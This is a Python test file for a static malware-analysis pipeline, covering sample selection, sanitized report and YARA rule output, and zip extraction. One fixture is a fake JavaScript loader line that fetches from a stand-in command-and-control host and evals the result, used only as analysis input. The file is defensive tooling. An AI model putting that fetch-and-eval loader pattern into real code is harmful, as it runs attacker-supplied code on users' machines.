from datetime import UTC, datetime
import json
from pathlib import Path
import zipfile

from loop_engineering.sample_static_analysis import (
    analyze_sample_bytes,
    select_single_candidate,
    write_single_sample_outputs,
)
from scripts.run_single_sample_loop import read_one_member_from_zip
from scripts.verify_single_sample_report import verify_report_dir


METADATA = {
    "sha256_hash": "a" * 64,
    "file_name": "loader.js",
    "file_type": "javascript",
    "first_seen": "2026-06-20 00:01:02",
    "signature": "ExampleLoader",
    "tags": ["js", "loader"],
}


def test_select_single_candidate_prefers_source_like_unseen():
    samples = [
        {"sha256_hash": "b" * 64, "file_name": "sample.exe", "file_type": "exe"},
        METADATA,
    ]

    selected = select_single_candidate(samples, seen_hashes=set())

    assert selected["sha256_hash"] == "a" * 64


def test_single_sample_outputs_are_sanitized_and_verifiable(tmp_path: Path):
    data = b'fetch("https://c2.example/a"); eval(code);'
    analysis = analyze_sample_bytes(data, METADATA, source_name="loader.js")

    report_dir = write_single_sample_outputs(analysis, tmp_path / "reports")
    findings = verify_report_dir(report_dir)

    assert findings == []
    assert (report_dir / "technical-analysis.md").exists()
    assert (report_dir / "sample.yar").exists()
    assert not (report_dir / "loader.js").exists()
    blog = (report_dir / "technical-analysis.md").read_text(encoding="utf-8")
    assert "Single-Sample Static Malware Analysis" in blog
    assert "https://c2.example/a" in blog
    assert "The sample was not executed" in blog
    analysis_json = json.loads((report_dir / "analysis.json").read_text(encoding="utf-8"))
    assert analysis_json["sha256"] == analysis.sha256


def test_read_one_member_from_password_zip_prefers_source_file(tmp_path: Path):
    zip_path = tmp_path / "sample.zip"
    with zipfile.ZipFile(zip_path, "w") as archive:
        archive.writestr("binary.bin", b"MZnot really")
        archive.writestr("loader.js", b"eval(code)")

    name, data = read_one_member_from_zip(zip_path)

    assert name == "loader.js"
    assert data == b"eval(code)"
